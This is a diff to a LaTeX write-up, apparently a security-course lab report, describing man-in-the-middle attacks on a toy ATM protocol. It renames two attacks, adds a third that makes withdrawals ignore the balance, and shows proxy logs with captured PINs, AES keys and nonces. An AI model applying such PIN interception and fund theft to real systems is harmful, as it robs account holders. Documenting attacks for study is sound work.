@@ -52,9 +52,9 @@ The way the initial handshake is supposed to work is:
 \end{enumerate}
 Since the proxy can read and modify all traffic (as well as start independent sessions without an ATM connected), if anyone tries to log in with the proxy in the middle the proxy can capture their PIN and transfer/withdraw all their money before logging them in.
 \\
-There are 2 currently implemented attacks that make use of this vulnerability, PassiveMITM and ActiveMITM.
+There are 3 currently implemented attacks that make use of this vulnerability: LogTraffic, InterceptCreds, and ArbitraryWithdrawal.
 \\
-PassiveMITM does the handshake, and then logs everything that goes through it to its standard out.
+LogTraffic does the handshake, and then logs everything that goes through it to its standard out.
 Sample ATM session:
 \begin{Verbatim}[frame=single,fontsize=\scriptsize]
 $ ./atm 1200
@@ -75,7 +75,7 @@ Alice has logged out.
 \end{Verbatim}
 Corresponding Proxy output (manually linebroken):
 \begin{Verbatim}[frame=single,fontsize=\scriptsize]
-$ ghc -O2 MitmProxy && ./MitmProxy PassiveMITM 1200 1201
+$ ghc -O2 MitmProxy && ./MitmProxy LogTraffic 1200 1201
 Received a connection from localhost:37933
 Forwarding to localhost:1201
 Raw AES key: "\SIY\DC3\158\129\231t)\206:\205,\181+\230\174"
@@ -106,7 +106,7 @@ actNewNonce = \"zVhz#XAI59876064\", actCmd = Logout, actAmount = 0, actRecipient
 1201 -> 37933: "Action {actUser = \"Alice\", actPin = \"\", actOldNonce = \"zVhz#XAI59876064\", 
 actNewNonce = \"vKzeCccX59876972\", actCmd = Logout, actAmount = 0, actRecipient = \"\"}"
 \end{Verbatim}
-ActiveMITM does the handshake and intercepts any PINs, using them to transfer everything to Eve.
+InterceptCreds does the handshake and intercepts any PINs, using them to transfer everything to Eve.
 It then allows the logins normally, and logs everything that goes through it to standard out,
 Sample ATM session:
 \begin{Verbatim}[frame=single,fontsize=\scriptsize]
@@ -148,7 +148,7 @@ Eve has logged out.
 \end{Verbatim}
 Corresponding Proxy output (manually linebroken):
 \begin{Verbatim}[frame=single,fontsize=\scriptsize]
-$ ghc -O2 MitmProxy && ./MitmProxy ActiveMITM 1200 1201
+$ ghc -O2 MitmProxy && ./MitmProxy InterceptCreds 1200 1201
 Received a connection from localhost:37969
 Forwarding to localhost:1201
 Raw AES key: "N\171\144\140H*\143L\208$DxJ\SUBgY"
@@ -212,6 +212,135 @@ actNewNonce = \"huSDKAoX89801595\", actCmd = Withdraw, actAmount = 0, actRecipie
 actNewNonce = \"bEk9GWp@92750849\", actCmd = Logout, actAmount = 0, actRecipient = \"\"}"
 1201 -> 37969: "Action {actUser = \"Eve\", actPin = \"\", actOldNonce = \"bEk9GWp@92750849\", 
 actNewNonce = \"9fYH$^UR92751503\", actCmd = Logout, actAmount = 0, actRecipient = \"\"}"
+\end{Verbatim}
+ArbitraryWithdrawal intercepts the handshake, passes though most commands normally, but intercepts all withdrawaals to cause them to work independent of the current balance.
+\\
+Sample ATM session:
+\begin{Verbatim}[frame=single,fontsize=\scriptsize]
+$ ./atm 1200
+login Alice
+Enter PIN:
+012345
+You've successfully logged in. Welcome Alice
+balance
+Your balance is 10000 cents.
+withdraw 25
+You withdrew 25 cents and your balance is now 10000 cents.
+withdraw 31337
+You withdrew 31337 cents and your balance is now 10000 cents.
+withdraw 42
+You withdrew 42 cents and your balance is now 10000 cents.
+withdraw 999999999
+You withdrew 999999999 cents and your balance is now 10000 cents.
+logout
+Alice has logged out.
+login Bob
+Enter PIN:
+654321
+You've successfully logged in. Welcome Bob
+balance
+Your balance is 5000 cents.
+withdraw 1337
+You withdrew 1337 cents and your balance is now 5000 cents.
+withdraw 256
+You withdrew 256 cents and your balance is now 5000 cents.
+logout
+Bob has logged out.
+login Eve
+Enter PIN:
+123456
+You've successfully logged in. Welcome Eve
+balance
+Your balance is 0 cents.
+withdraw 0
+You withdrew 0 cents and your balance is now 0 cents.
+withdraw 65536
+You withdrew 65536 cents and your balance is now 0 cents.
+withdraw 512
+You withdrew 512 cents and your balance is now 0 cents.
+logout
+Eve has logged out.
+\end{Verbatim}
+Corresponding Proxy output (manually linebroken):
+\begin{Verbatim}[frame=single,fontsize=\scriptsize]
+$ ghc -O2 MitmProxy && ./MitmProxy ArbitraryWithdrawal 1200 1201
+Received a connection from localhost:38737
+Forwarding to localhost:1201
+Raw AES key: "\235\221\193={\189\&7\EOT'<O~\DC3\187\130\199"
+Raw AES IV: "?\EOTA\231\203[\182\142\227\248N\203*\220\213\157"
+Raw Initial Nonce: "UL6vS01H6005169"
+38737 -> 1201: "Action {actUser = \"Alice\", actPin = \"012345\", actOldNonce = \"UL6vS01H6005169\", 
+actNewNonce = \"70a3KfIc7249160\", actCmd = Login, actAmount = 0, actRecipient = \"\"}"
+1201 -> 38737: "Action {actUser = \"Alice\", actPin = \"\", actOldNonce = \"70a3KfIc7249160\", 
+actNewNonce = \"ct*NM$xd9198589\", actCmd = Login, actAmount = 0, actRecipient = \"\"}"
+38737 -> 1201: "Action {actUser = \"Alice\", actPin = \"\", actOldNonce = \"ct*NM$xd9198589\", 
+actNewNonce = \"blOgvEst11165527\", actCmd = Balance, actAmount = 0, actRecipient = \"\"}"
+1201 -> 38737: "Action {actUser = \"Alice\", actPin = \"\", actOldNonce = \"blOgvEst11165527\", 
+actNewNonce = \"5V9!8fwa11166597\", actCmd = Balance, actAmount = 10000, actRecipient = \"\"}"
+38737 -> 1201: "Action {actUser = \"Alice\", actPin = \"\", actOldNonce = \"5V9!8fwa11166597\", 
+actNewNonce = \"e1dRDEO!14604306\", actCmd = Withdraw, actAmount = 25, actRecipient = \"\"}"
+1201 -> 38737: "Action {actUser = \"Alice\", actPin = \"\", actOldNonce = \"e1dRDEO!14604306\", 
+actNewNonce = \"lAR8dula14605124\", actCmd = Balance, actAmount = 10000, actRecipient = \"\"}"
+38737 -> 1201: "Action {actUser = \"Alice\", actPin = \"\", actOldNonce = \"lAR8dula14605124\", 
+actNewNonce = \"g87CAHQ018523302\", actCmd = Withdraw, actAmount = 31337, actRecipient = \"\"}"
+1201 -> 38737: "Action {actUser = \"Alice\", actPin = \"\", actOldNonce = \"g87CAHQ018523302\", 
+actNewNonce = \"OqID3EK$18523828\", actCmd = Balance, actAmount = 10000, actRecipient = \"\"}"
+38737 -> 1201: "Action {actUser = \"Alice\", actPin = \"\", actOldNonce = \"OqID3EK$18523828\", 
+actNewNonce = \"sed$nh@v22960533\", actCmd = Withdraw, actAmount = 42, actRecipient = \"\"}"
+1201 -> 38737: "Action {actUser = \"Alice\", actPin = \"\", actOldNonce = \"sed$nh@v22960533\", 
+actNewNonce = \"^q1sJ0&D22961703\", actCmd = Balance, actAmount = 10000, actRecipient = \"\"}"
+38737 -> 1201: "Action {actUser = \"Alice\", actPin = \"\", actOldNonce = \"^q1sJ0&D22961703\", 
+actNewNonce = \"w4#GbErZ57231143\", actCmd = Withdraw, actAmount = 999999999, actRecipient = \"\"}"
+1201 -> 38737: "Action {actUser = \"Alice\", actPin = \"\", actOldNonce = \"w4#GbErZ57231143\", 
+actNewNonce = \"cwO92jsh57232157\", actCmd = Balance, actAmount = 10000, actRecipient = \"\"}"
+38737 -> 1201: "Action {actUser = \"Alice\", actPin = \"\", actOldNonce = \"cwO92jsh57232157\", 
+actNewNonce = \"N5Iyxkc360203413\", actCmd = Logout, actAmount = 0, actRecipient = \"\"}"
+1201 -> 38737: "Action {actUser = \"Alice\", actPin = \"\", actOldNonce = \"N5Iyxkc360203413\", 
+actNewNonce = \"qIqQ8Eut60204081\", actCmd = Logout, actAmount = 0, actRecipient = \"\"}"
+38737 -> 1201: "Action {actUser = \"Bob\", actPin = \"654321\", actOldNonce = \"qIqQ8Eut60204081\", 
+actNewNonce = \"78W05aGR62324634\", actCmd = Login, actAmount = 0, actRecipient = \"\"}"
+1201 -> 38737: "Action {actUser = \"Bob\", actPin = \"\", actOldNonce = \"78W05aGR62324634\", 
+actNewNonce = \"KgHM64&z66314046\", actCmd = Login, actAmount = 0, actRecipient = \"\"}"
+38737 -> 1201: "Action {actUser = \"Bob\", actPin = \"\", actOldNonce = \"KgHM64&z66314046\", 
+actNewNonce = \"qzZqz9H468912119\", actCmd = Balance, actAmount = 0, actRecipient = \"\"}"
+1201 -> 38737: "Action {actUser = \"Bob\", actPin = \"\", actOldNonce = \"qzZqz9H468912119\", 
+actNewNonce = \"VoK#Qxyo68913219\", actCmd = Balance, actAmount = 5000, actRecipient = \"\"}"
+38737 -> 1201: "Action {actUser = \"Bob\", actPin = \"\", actOldNonce = \"VoK#Qxyo68913219\", 
+actNewNonce = \"IvstQTTT78156101\", actCmd = Withdraw, actAmount = 1337, actRecipient = \"\"}"
+1201 -> 38737: "Action {actUser = \"Bob\", actPin = \"\", actOldNonce = \"IvstQTTT78156101\", 
+actNewNonce = \"jGm$9Zpe78156702\", actCmd = Balance, actAmount = 5000, actRecipient = \"\"}"
+38737 -> 1201: "Action {actUser = \"Bob\", actPin = \"\", actOldNonce = \"jGm$9Zpe78156702\", 
+actNewNonce = \"c&lSTKcG84360437\", actCmd = Withdraw, actAmount = 256, actRecipient = \"\"}"
+1201 -> 38737: "Action {actUser = \"Bob\", actPin = \"\", actOldNonce = \"c&lSTKcG84360437\", 
+actNewNonce = \"9c$etQxw84361277\", actCmd = Balance, actAmount = 5000, actRecipient = \"\"}"
+38737 -> 1201: "Action {actUser = \"Bob\", actPin = \"\", actOldNonce = \"9c$etQxw84361277\", 
+actNewNonce = \"DXaWjf2r87825790\", actCmd = Logout, actAmount = 0, actRecipient = \"\"}"
+1201 -> 38737: "Action {actUser = \"Bob\", actPin = \"\", actOldNonce = \"DXaWjf2r87825790\", 
+actNewNonce = \"9cu5&3WK87826916\", actCmd = Logout, actAmount = 0, actRecipient = \"\"}"
+38737 -> 1201: "Action {actUser = \"Eve\", actPin = \"123456\", actOldNonce = \"9cu5&3WK87826916\", 
+actNewNonce = \"7TB4tqLR91145319\", actCmd = Login, actAmount = 0, actRecipient = \"\"}"
+1201 -> 38737: "Action {actUser = \"Eve\", actPin = \"\", actOldNonce = \"7TB4tqLR91145319\", 
+actNewNonce = \"L0pWhVY994541249\", actCmd = Login, actAmount = 0, actRecipient = \"\"}"
+38737 -> 1201: "Action {actUser = \"Eve\", actPin = \"\", actOldNonce = \"L0pWhVY994541249\", 
+actNewNonce = \"!foxolLg3182763\", actCmd = Balance, actAmount = 0, actRecipient = \"\"}"
+1201 -> 38737: "Action {actUser = \"Eve\", actPin = \"\", actOldNonce = \"!foxolLg3182763\", 
+actNewNonce = \"XP2TODT83183945\", actCmd = Balance, actAmount = 0, actRecipient = \"\"}"
+38737 -> 1201: "Action {actUser = \"Eve\", actPin = \"\", actOldNonce = \"XP2TODT83183945\", 
+actNewNonce = \"0cF31MfT12498872\", actCmd = Withdraw, actAmount = 0, actRecipient = \"\"}"
+1201 -> 38737: "Action {actUser = \"Eve\", actPin = \"\", actOldNonce = \"0cF31MfT12498872\", 
+actNewNonce = \"aqF7qnQn12499577\", actCmd = Balance, actAmount = 0, actRecipient = \"\"}"
+38737 -> 1201: "Action {actUser = \"Eve\", actPin = \"\", actOldNonce = \"aqF7qnQn12499577\", 
+actNewNonce = \"84V1nQ!W20767422\", actCmd = Withdraw, actAmount = 65536, actRecipient = \"\"}"
+1201 -> 38737: "Action {actUser = \"Eve\", actPin = \"\", actOldNonce = \"84V1nQ!W20767422\", 
+actNewNonce = \"jXliKUvC20768152\", actCmd = Balance, actAmount = 0, actRecipient = \"\"}"
+38737 -> 1201: "Action {actUser = \"Eve\", actPin = \"\", actOldNonce = \"jXliKUvC20768152\", 
+actNewNonce = \"947O!inR28581476\", actCmd = Withdraw, actAmount = 512, actRecipient = \"\"}"
+1201 -> 38737: "Action {actUser = \"Eve\", actPin = \"\", actOldNonce = \"947O!inR28581476\", 
+actNewNonce = \"gMnJAy#&28582393\", actCmd = Balance, actAmount = 0, actRecipient = \"\"}"
+38737 -> 1201: "Action {actUser = \"Eve\", actPin = \"\", actOldNonce = \"gMnJAy#&28582393\", 
+actNewNonce = \"wfvHlpQY33712219\", actCmd = Logout, actAmount = 0, actRecipient = \"\"}"
+1201 -> 38737: "Action {actUser = \"Eve\", actPin = \"\", actOldNonce = \"wfvHlpQY33712219\", 
+actNewNonce = \"WTE*ZJYP33713278\", actCmd = Logout, actAmount = 0, actRecipient = \"\"}"
 \end{Verbatim}
 \section*{Attempted unsuccessful attacks}
 \subsection*{Remote Code Execution}
